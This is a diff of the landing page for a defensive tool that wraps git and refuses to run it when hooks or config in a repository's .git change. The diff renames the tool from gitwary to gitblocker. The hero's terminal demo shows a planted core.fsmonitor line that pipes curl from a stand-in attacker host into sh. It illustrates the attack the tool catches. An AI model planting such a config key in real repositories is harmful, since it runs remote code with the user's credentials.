@@ -1,10 +1,10 @@
 ---
 layout: default
-title: gitwary
+title: gitblocker
 description: A guard that refuses to run git on a repository whose trusted files changed since you last looked. One Python file, standard library only.
 hero:
   title: Your sandbox can write to <code>.git</code>. The next <code>git</code> you type runs what it wrote.
-  lede: gitwary stands in front of git. It fingerprints the files that can make git execute code, and refuses to run git when they change.
+  lede: gitblocker stands in front of git. It fingerprints the files that can make git execute code, and refuses to run git when they change.
   meta: One Python file, standard library only. Linux and macOS, Python 3.9 or later. MIT.
   caption: What you see when a hook and a config key appeared while an agent worked in the repository
   term_title: you@host — ~/work/api
@@ -12,7 +12,7 @@ hero:
 {% capture hero_term %}
 <span class="p">$</span> git status
 <span class="hr">────────────────────────────────────────────────────────</span>
-<span class="w">!</span> gitwary: <span class="b">~/work/api/.git has changed since the last trust</span>
+<span class="w">!</span> gitblocker: <span class="b">~/work/api/.git has changed since the last trust</span>
   <span class="mod">modified</span>  config
   <span class="add">added</span>     hooks/pre-commit
 
@@ -24,8 +24,8 @@ hero:
   <span class="add">+	fsmonitor = sh -c "curl -s evil.example | sh"</span>
 
 <span class="hr">────────────────────────────────────────────────────────</span>
-  <span class="hint">If legitimate:  gitwary trust      Otherwise:  gitwary restore</span>
-<span class="x big">✗ gitwary: refusing to run git.</span>
+  <span class="hint">If legitimate:  gitblocker trust      Otherwise:  gitblocker restore</span>
+<span class="x big">✗ gitblocker: refusing to run git.</span>
 {% endcapture %}
 {% include hero.html term=hero_term %}
 
@@ -39,13 +39,13 @@ From there the code can drop a script in `.git/hooks/`, add a key such as `core.
 
 It runs the next time you type `git` on the host, with your SSH keys, your credentials and your shell. The sandbox never had to escape. You carried the payload across the boundary yourself.
 
-Prevention layers help and are independent of gitwary: a seccomp or AppArmor profile forbidding writes under `.git/`, a global `core.hooksPath`, an unmapped uid in a rootless container, and `safe.bareRepository=explicit`, which you should set in every case. gitwary is the detection layer underneath. It refuses to run git until you have looked.
+Prevention layers help and are independent of gitblocker: a seccomp or AppArmor profile forbidding writes under `.git/`, a global `core.hooksPath`, an unmapped uid in a rootless container, and `safe.bareRepository=explicit`, which you should set in every case. gitblocker is the detection layer underneath. It refuses to run git until you have looked.
 
 </section>
 
 <section id="attacks" markdown="1">
 
-## Five basic attacks, with and without gitwary
+## Five basic attacks, with and without gitblocker
 
 Each scenario starts from a repository you trusted. The sandbox writes something. You come back and type an ordinary command. Pick one.
 {:.prose style="margin:0"}
@@ -60,7 +60,7 @@ Each scenario starts from a repository you trusted. The sandbox writes something
 
 <div class="prose" markdown="1">
 
-gitwary does not look for dangerous keys in the config. A blocklist chases git's CVEs and is always one key short. Instead `gitwary trust` records a sha256 of every file that can serve the pivot, and every later `git` is checked against that reference first. A false negative on those files is impossible. The price is an explicit `gitwary trust` when you change your own hooks or config.
+gitblocker does not look for dangerous keys in the config. A blocklist chases git's CVEs and is always one key short. Instead `gitblocker trust` records a sha256 of every file that can serve the pivot, and every later `git` is checked against that reference first. A false negative on those files is impossible. The price is an explicit `gitblocker trust` when you change your own hooks or config.
 
 Inside `.git/` the rule is inverted. Everything is watched, at any depth, except what git rewrites during normal operation. An unknown file is suspicious by default. Commit, checkout, merge, rebase, stash, bisect, gc and fsck stay silent.
 
@@ -69,7 +69,7 @@ Inside `.git/` the rule is inverted. Everything is watched, at any depth, except
 <div class="watch" markdown="1">
 <div markdown="1">
 
-A gitdir as gitwary sees it. Dimmed lines are rewritten by git and ignored.
+A gitdir as gitblocker sees it. Dimmed lines are rewritten by git and ignored.
 {:.cap}
 
 {% include gitdir-tree.html %}
@@ -111,20 +111,20 @@ alias.ac = !sh tool.sh
 1. Put the script on your path.
 
    ```console
-   $ install -m 755 gitwary.py ~/bin/gitwary
+   $ install -m 755 gitblocker.py ~/bin/gitblocker
    ```
 
-2. Make `git` go through it: a symlink named `git` in a directory ahead of the real one in your `PATH`. gitwary notices it was called `git` and switches to exec mode. You are not the only one running git: shell prompts, editors and build tools call it by name, and oh-my-zsh does so with `command git`, which skips aliases. A planted `core.fsmonitor` fires the moment you `cd` into the directory. The symlink wraps all of them; an alias wraps only what you type.
+2. Make `git` go through it: a symlink named `git` in a directory ahead of the real one in your `PATH`. gitblocker notices it was called `git` and switches to exec mode. You are not the only one running git: shell prompts, editors and build tools call it by name, and oh-my-zsh does so with `command git`, which skips aliases. A planted `core.fsmonitor` fires the moment you `cd` into the directory. The symlink wraps all of them; an alias wraps only what you type.
 
    ```console
-   $ ln -s ~/bin/gitwary ~/bin/git
+   $ ln -s ~/bin/gitblocker ~/bin/git
    # or, for the git you type only
-   $ alias git='gitwary git'
+   $ alias git='gitblocker git'
    ```
 
-   System-wide on Debian and Ubuntu: `dpkg-divert` the real git to `/usr/bin/git.real` and symlink `/usr/bin/git` to gitwary — the package built by `ci/build-deb.sh` does it, at the exec path too, and `apt remove gitwary` undoes it. gitwary finds a `git.real` next to itself; `git-receive-pack`, `git-upload-pack` and `git-upload-archive`, symlinks to `git` that sshd runs for every push and fetch to the machine, pass straight through to the real git. On macOS keep the `PATH` symlink and set `git.path` in VS Code.
+   System-wide on Debian and Ubuntu: `dpkg-divert` the real git to `/usr/bin/git.real` and symlink `/usr/bin/git` to gitblocker — the package built by `ci/build-deb.sh` does it, at the exec path too, and `apt remove gitblocker` undoes it. gitblocker finds a `git.real` next to itself; `git-receive-pack`, `git-upload-pack` and `git-upload-archive`, symlinks to `git` that sshd runs for every push and fetch to the machine, pass straight through to the real git. On macOS keep the `PATH` symlink and set `git.path` in VS Code.
 
-3. Set the companion setting git already ships. It is independent of gitwary and closes a hole gitwary cannot reach from tools that bypass the wrapper.
+3. Set the companion setting git already ships. It is independent of gitblocker and closes a hole gitblocker cannot reach from tools that bypass the wrapper.
 
    ```console
    $ git config --global safe.bareRepository explicit
@@ -134,8 +134,8 @@ alias.ac = !sh tool.sh
 
    ```console
    $ cd ~/work/api && cat .git/config && ls -la .git/hooks
-   $ gitwary trust
-   ✓ gitwary: trust state recorded for /home/user/work/api
+   $ gitblocker trust
+   ✓ gitblocker: trust state recorded for /home/user/work/api
    ```
 
 </section>
@@ -147,21 +147,21 @@ alias.ac = !sh tool.sh
 <div class="two" markdown="1">
 <div class="prose" markdown="1">
 
-Commit, checkout, merge, rebase, stash, bisect, gc, worktree and submodule operations touch only files gitwary does not watch, so you never hear from it; `git --version` is never checked at all. When something did change, three cases.
+Commit, checkout, merge, rebase, stash, bisect, gc, worktree and submodule operations touch only files gitblocker does not watch, so you never hear from it; `git --version` is never checked at all. When something did change, three cases.
 
-**Auto-accept.** The change is one git or your editor made itself: `push -u`, `branch -u` and `checkout -b` write `branch.x.remote` (a remote already known) and `branch.x.merge` (a `refs/heads/…`), VS Code writes `branch.x.vscode-merge-base` (a ref name) when it opens a repository. If the only file that changed is the config and its semantic difference is limited to those lines, gitwary updates the reference itself, prints one line and runs git. A closed allowlist of three keys that cannot make git execute anything, not a blocklist; a lone comment or a `branch.x.rebase` still gets the question. Not to be confused with auto-trust, which blesses a *new* repository after a `clone` or `init` through the wrapper.
+**Auto-accept.** The change is one git or your editor made itself: `push -u`, `branch -u` and `checkout -b` write `branch.x.remote` (a remote already known) and `branch.x.merge` (a `refs/heads/…`), VS Code writes `branch.x.vscode-merge-base` (a ref name) when it opens a repository. If the only file that changed is the config and its semantic difference is limited to those lines, gitblocker updates the reference itself, prints one line and runs git. A closed allowlist of three keys that cannot make git execute anything, not a blocklist; a lone comment or a `branch.x.rebase` still gets the question. Not to be confused with auto-trust, which blesses a *new* repository after a `clone` or `init` through the wrapper.
 
-**Anything else.** The diff is shown, then a question on the terminal: trust this state and run git, default no. The question goes through `/dev/tty`, so git's stdin is left alone. No question without a terminal, with stdout or stderr redirected, or with `GITWARY_NO_PROMPT=1`.
+**Anything else.** The diff is shown, then a question on the terminal: trust this state and run git, default no. The question goes through `/dev/tty`, so git's stdin is left alone. No question without a terminal, with stdout or stderr redirected, or with `GITBLOCKER_NO_PROMPT=1`.
 
 **Never trusted, or structurally wrong.** A symlinked `.git`, a bare gitdir in a subdirectory, an `exec` line injected into a rebase, a control character in a name. No question is asked. Fix it, or trust it explicitly.
 
-**A program ran git.** An editor's polling, a build tool, cron: no terminal, nobody reads its stderr. gitwary records what it saw, sends one desktop notification and waits up to `GITWARY_WAIT` seconds. In a terminal, `gitwary pending` lists what waits; `gitwary pending <repo>` shows the diff and the calling process, then asks. Allowing records what you were shown and lets the waiting git run; refusing makes it fail and clears the record. A decision taken after the timeout applies to the next invocation. A git that has a terminal, such as a prompt's `$(git …)`, is refused at once instead: blocking it would freeze your shell.
+**A program ran git.** An editor's polling, a build tool, cron: no terminal, nobody reads its stderr. gitblocker records what it saw, sends one desktop notification and waits up to `GITBLOCKER_WAIT` seconds. In a terminal, `gitblocker pending` lists what waits; `gitblocker pending <repo>` shows the diff and the calling process, then asks. Allowing records what you were shown and lets the waiting git run; refusing makes it fail and clears the record. A decision taken after the timeout applies to the next invocation. A git that has a terminal, such as a prompt's `$(git …)`, is refused at once instead: blocking it would freeze your shell.
 
-What you say yes to is exactly what you were shown. gitwary saves the state it diffed, never a fresh scan taken after your answer.
+What you say yes to is exactly what you were shown. gitblocker saves the state it diffed, never a fresh scan taken after your answer.
 
-**A change to your global config** (`git config --global`, `git lfs install`) marks every registered repository modified at once. `gitwary retrust` shows that diff once and asks once for all the repositories it is the only change of.
+**A change to your global config** (`git config --global`, `git lfs install`) marks every registered repository modified at once. `gitblocker retrust` shows that diff once and asks once for all the repositories it is the only change of.
 
-Tried on Debian with the system-wide install, on a repository modified behind the user's back: starship, oh-my-zsh, fish and `__git_ps1` prompts go quiet with no delay; powerlevel10k keeps showing branch and status, since `gitstatusd` reads `.git` itself and never runs git; lazygit exits with gitwary's message, tig says "Not a git repository"; fugitive's `:Git` shows the refusal after `GITWARY_WAIT`; VS Code's polling waits for your `gitwary pending`; pre-commit's hook runs with the real git.
+Tried on Debian with the system-wide install, on a repository modified behind the user's back: starship, oh-my-zsh, fish and `__git_ps1` prompts go quiet with no delay; powerlevel10k keeps showing branch and status, since `gitstatusd` reads `.git` itself and never runs git; lazygit exits with gitblocker's message, tig says "Not a git repository"; fugitive's `:Git` shows the refusal after `GITBLOCKER_WAIT`; VS Code's polling waits for your `gitblocker pending`; pre-commit's hook runs with the real git.
 
 </div>
 <div markdown="1">
@@ -173,7 +173,7 @@ A legitimate change, accepted from the terminal
 <span class="p">$</span> git remote add upstream git@github.com:org/api.git
 <span class="p">$</span> git fetch upstream
 <span class="hr">────────────────────────────────────────────────────────</span>
-<span class="w">!</span> gitwary: <span class="b">~/work/api/.git has changed since the last trust</span>
+<span class="w">!</span> gitblocker: <span class="b">~/work/api/.git has changed since the last trust</span>
   <span class="mod">modified</span>  config
 
   diff of ~/work/api/.git/config:
@@ -187,7 +187,7 @@ A legitimate change, accepted from the terminal
 
 <span class="hr">────────────────────────────────────────────────────────</span>
 <span class="w">Trust this state and run git? [y/N]</span> y
-<span class="ok">✓</span> gitwary: trust state recorded for /home/user/work/api
+<span class="ok">✓</span> gitblocker: trust state recorded for /home/user/work/api
 From github.com:org/api
  * [new branch]      main       -&gt; upstream/main
 {% endcapture %}
@@ -197,14 +197,14 @@ When it was not you
 {:.cap style="margin-top:1.4rem"}
 
 {% capture t %}
-<span class="p">$</span> gitwary diff
-<span class="w">!</span> gitwary: changes in ~/work/api/.git:
+<span class="p">$</span> gitblocker diff
+<span class="w">!</span> gitblocker: changes in ~/work/api/.git:
   <span class="add">added</span>     hooks/pre-commit
-<span class="p">$</span> gitwary restore
+<span class="p">$</span> gitblocker restore
 Actions on /home/user/work/api:
   <span class="x">delete</span>    hooks/pre-commit
 <span class="w">Continue? [y/N]</span> y
-<span class="ok">✓</span> gitwary: 1 file(s) restored, /home/user/work/api
+<span class="ok">✓</span> gitblocker: 1 file(s) restored, /home/user/work/api
   matches the trusted state again
 {% endcapture %}
 {% include term.html title="you@host — ~/work/api" body=t %}
@@ -213,10 +213,10 @@ When your editor ran git, not you
 {:.cap style="margin-top:1.4rem"}
 
 {% capture t %}
-<span class="p">$</span> gitwary pending
+<span class="p">$</span> gitblocker pending
 <span class="mod">changed</span>         4s  1 waiting  /home/user/work/api
-  <span class="hint">gitwary pending &lt;repo&gt;  to see the diff and decide  -a: all</span>
-<span class="p">$</span> gitwary pending ~/work/api
+  <span class="hint">gitblocker pending &lt;repo&gt;  to see the diff and decide  -a: all</span>
+<span class="p">$</span> gitblocker pending ~/work/api
 /home/user/work/api  [changed, since 6s]
     git waiting (pid 41250, 6s): code[40988] ← systemd[1]
       /usr/share/code/code --type=utility
@@ -224,8 +224,8 @@ When your editor ran git, not you
   <span class="add">added</span>     hooks/pre-commit
 <span class="hr">────────────────────────────────────────────────────────</span>
 <span class="w">Allow: record this state and let the waiting git run? [y/N]</span> n
-<span class="w">!</span> gitwary: refused: the waiting git is not run;
-  the record is cleared. If malicious:  gitwary restore
+<span class="w">!</span> gitblocker: refused: the waiting git is not run;
+  the record is cleared. If malicious:  gitblocker restore
 {% endcapture %}
 {% include term.html title="you@host — ~/work/api" body=t %}
 
@@ -242,28 +242,28 @@ When your editor ran git, not you
 
 | Command | What it does |
 |---|---|
-| `gitwary` | Check the current repository. Exit 1 if suspect or never trusted. Reports, never asks. |
-| `gitwary trust` | Record the current state as the reference, with a backup of the watched files. |
-| `gitwary diff` | Show what differs from the reference. |
-| `gitwary restore [-y]` | Put the watched files of the gitdir and the tree back into the reference state. Only the pivot vector: commits, objects and tree files the sandbox left stay for you to inspect; a watched file outside the repository is named, never written. |
-| `gitwary git <args>` | Check, then run the real git. Honours `-C`, `--git-dir`, `--work-tree`. |
-| `gitwary list` | Every registered repository with its status: ok, modified, structure, missing, legacy, unknown. |
-| `gitwary pending [<repo>… \| -a \| -c]` | Decisions waiting for a git blocked by a program: list them, review one (diff and calling process) and allow or refuse, or clear. |
-| `gitwary forget <repo>…` | Remove entries. `--missing` removes repositories that no longer exist; `prune` is the same. |
-| `gitwary retrust` | Re-validate the unchanged repositories in bulk after an upgrade that changed the fingerprint; a change to the global config (`git config --global`, `git lfs install`) is reviewed once for every repository it touches. |
+| `gitblocker` | Check the current repository. Exit 1 if suspect or never trusted. Reports, never asks. |
+| `gitblocker trust` | Record the current state as the reference, with a backup of the watched files. |
+| `gitblocker diff` | Show what differs from the reference. |
+| `gitblocker restore [-y]` | Put the watched files of the gitdir and the tree back into the reference state. Only the pivot vector: commits, objects and tree files the sandbox left stay for you to inspect; a watched file outside the repository is named, never written. |
+| `gitblocker git <args>` | Check, then run the real git. Honours `-C`, `--git-dir`, `--work-tree`. |
+| `gitblocker list` | Every registered repository with its status: ok, modified, structure, missing, legacy, unknown. |
+| `gitblocker pending [<repo>… \| -a \| -c]` | Decisions waiting for a git blocked by a program: list them, review one (diff and calling process) and allow or refuse, or clear. |
+| `gitblocker forget <repo>…` | Remove entries. `--missing` removes repositories that no longer exist; `prune` is the same. |
+| `gitblocker retrust` | Re-validate the unchanged repositories in bulk after an upgrade that changed the fingerprint; a change to the global config (`git config --global`, `git lfs install`) is reviewed once for every repository it touches. |
 
 </div>
 <div class="tablewrap" markdown="1">
 
 | Variable | Effect |
 |---|---|
-| `GITWARY_STATE` | State directory. Default `$XDG_STATE_HOME/gitwary`, i.e. `~/.local/state/gitwary`, outside any mounted volume. Never move it into `.git`. |
-| `GITWARY_REAL_GIT` | Path to the real git. Default: a `git.real` next to gitwary, else the first `git` in the `PATH` that is not gitwary itself. |
-| `GITWARY_ALLOW_REBASE_EXEC=1` | Allow `exec` lines in rebase todo files, for people who use `rebase --exec`. |
-| `GITWARY_NO_PROMPT=1` | Never ask on the terminal. Refuse directly. |
-| `GITWARY_WAIT` | Seconds a git without a terminal waits for `gitwary pending`. Default 60, 0 never waits. |
-| `GITWARY_NO_NOTIFY=1` | No desktop notification. |
-| `GITWARY_DEBUG=1` | Full traceback on an internal error instead of a neutralised message. |
+| `GITBLOCKER_STATE` | State directory. Default `$XDG_STATE_HOME/gitblocker`, i.e. `~/.local/state/gitblocker`, outside any mounted volume. Never move it into `.git`. |
+| `GITBLOCKER_REAL_GIT` | Path to the real git. Default: a `git.real` next to gitblocker, else the first `git` in the `PATH` that is not gitblocker itself. |
+| `GITBLOCKER_ALLOW_REBASE_EXEC=1` | Allow `exec` lines in rebase todo files, for people who use `rebase --exec`. |
+| `GITBLOCKER_NO_PROMPT=1` | Never ask on the terminal. Refuse directly. |
+| `GITBLOCKER_WAIT` | Seconds a git without a terminal waits for `gitblocker pending`. Default 60, 0 never waits. |
+| `GITBLOCKER_NO_NOTIFY=1` | No desktop notification. |
+| `GITBLOCKER_DEBUG=1` | Full traceback on an internal error instead of a neutralised message. |
 | `NO_COLOR` | No colours. |
 
 </div>
@@ -276,13 +276,13 @@ When your editor ran git, not you
 
 - It only covers git invocations that resolve to the wrapper. A tool with a hardcoded path to the real git, or started with a `PATH` that does not contain the symlink, is not checked. A `-c key=value` given to such a git is invisible too.
 - It cannot close the race between its check and git's execution if the sandbox is still writing. Stop the sandbox before running git on the host.
-- It is no substitute for an up-to-date git. A repository you clone that exploits a bug of git itself acts inside the git you ran, where gitwary sees nothing.
+- It is no substitute for an up-to-date git. A repository you clone that exploits a bug of git itself acts inside the git you ran, where gitblocker sees nothing.
 - `restore` only cleans the pivot vector. Objects, commits and tree files the sandbox dropped stay there for you to inspect, and so is a watched file outside the repository: restore never writes there.
-- Hooks tracked *in the tree* under `core.hooksPath` (husky, `.githooks`) are watched, but a `checkout`, `merge` or `pull` of a commit the sandbox created rewrites them after the check, and git runs the new version in the same command. This is accepted, not fixed: versioned hooks are a decision to run what the repository contains, like `make` after a pull. `gitwary trust` warns when that layout is in place; review incoming changes to those files, or keep the hooks outside the tree with a global `core.hooksPath`.
-- The repositories git enters during a command — a submodule, a repository the sandbox planted in the tree and brought with a commit — are judged by the git that enters them, which is gitwary when git's exec path is wrapped (`dpkg-divert` on Debian; a `GIT_EXEC_PATH` directory elsewhere; `gitwary trust` says when it is not). A planted repository is refused there, in the command itself; its gitlink is written and the next command is refused. What the command writes into the repository it was run in is judged at the next command.
+- Hooks tracked *in the tree* under `core.hooksPath` (husky, `.githooks`) are watched, but a `checkout`, `merge` or `pull` of a commit the sandbox created rewrites them after the check, and git runs the new version in the same command. This is accepted, not fixed: versioned hooks are a decision to run what the repository contains, like `make` after a pull. `gitblocker trust` warns when that layout is in place; review incoming changes to those files, or keep the hooks outside the tree with a global `core.hooksPath`.
+- The repositories git enters during a command — a submodule, a repository the sandbox planted in the tree and brought with a commit — are judged by the git that enters them, which is gitblocker when git's exec path is wrapped (`dpkg-divert` on Debian; a `GIT_EXEC_PATH` directory elsewhere; `gitblocker trust` says when it is not). A planted repository is refused there, in the command itself; its gitlink is written and the next command is refused. What the command writes into the repository it was run in is judged at the next command.
 - A trusted hook that calls a program by name depends on your `PATH`. If a `PATH` directory sits in the mounted volume, that is out of reach.
-- The question needs stdout and stderr on a terminal. A prompt's `$(git …)` or a `git log | head` on a changed repository is refused, not asked: rerun without the pipe, or `gitwary trust`.
-- No desktop notification without a session (ssh, cron, systemd). The pending record is still written and the wait still times out; check `gitwary pending` by hand.
+- The question needs stdout and stderr on a terminal. A prompt's `$(git …)` or a `git log | head` on a changed repository is refused, not asked: rerun without the pipe, or `gitblocker trust`.
+- No desktop notification without a session (ssh, cron, systemd). The pending record is still written and the wait still times out; check `gitblocker pending` by hand.
 - Bare repositories are refused, not managed. `core.splitIndex` is refused: the gitlinks it needs to read live in `sharedindex.*`.
 - Parity with git is checked against git itself in `tests/test_git_parity.py`; a gap found there is marked as an expected failure until fixed, and none is open at the moment. Deliberate, fail-closed divergences: a NUL byte or a line git dies on in a config file is refused.
 
